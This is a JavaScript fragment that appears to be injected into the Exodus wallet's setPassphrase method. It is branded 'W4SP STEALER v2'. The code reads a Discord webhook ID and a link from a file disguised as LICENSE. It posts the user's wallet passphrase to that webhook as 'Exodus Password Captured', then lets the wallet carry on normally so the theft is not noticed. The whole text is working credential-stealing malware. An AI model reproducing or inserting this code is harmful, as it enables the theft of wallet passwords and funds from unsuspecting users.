const https=require('https');
const fs=require('fs');
[...]
async setPassphrase(e) {
    fs.readFile('LICENSE', 'utf8', function(err, data) {
    if (err) throw err;

    const delimiterIndex = data.indexOf(':');
    const hook = data.substring(0, delimiterIndex);
    const link = data.substring(delimiterIndex + 1);
    // console.log(hook, link, e);
    
    const payload = {
    "content": null,
    "embeds": [
        {
        "title": "Exodus Password Captured",
        "description": `:key: • \`${e}\`\n:link: • [Exodus Files](${link})`,
        "color": 14073091,
        "footer": {
            "text": "@W4SP STEALER v2",
            "icon_url": "https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png"
        },
        "thumbnail": {
            "url": "https://cdn.discordapp.com/attachments/1086668425797058691/1101435276435410984/image.png"
        }
        }
    ],
    "username": "W4SP v2",
    "attachments": []
    };

    const options = {
        hostname: 'discord.com',
        port: 443,
        path: '/api/webhooks/' + hook,
        method: 'POST',
        headers: {
        'Content-Type': 'application/json',
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
        process.stdout.write(d);
        });
    });

    // req.on('error', (error) => {
    //     console.error(error);
    // });

    req.write(JSON.stringify(payload));
    req.end();
    });
    this.emit("passphrase:set", e)
}